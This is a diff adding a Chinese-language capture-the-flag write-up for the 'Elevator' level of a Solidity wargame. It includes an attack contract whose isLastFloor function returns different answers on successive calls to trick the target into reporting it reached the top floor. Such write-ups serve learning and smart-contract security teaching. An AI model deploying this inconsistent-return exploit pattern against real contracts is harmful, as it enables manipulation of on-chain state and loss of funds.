@@ -107,3 +107,21 @@ contract Hack {
      }
 }
 ```
+## 12. Elevator
+编写攻击合约, 实现isLastFloor方法, 判断Elevator合约的floor是否为目标楼层, 根据情况返回结果
+```solidity
+contract Hack {
+    Elevator e = Elevator(0x5C77b7D11a6CeDc83D0f41D096C3E6874dF7CeF9);
+    
+    function hack() public  {
+        e.goTo(10);
+    }
+
+    function isLastFloor(uint256 floor) external view returns (bool) {
+        uint256 i = e.floor();
+        if (i == floor) return true;
+        else return false;
+    }
+
+}
+```
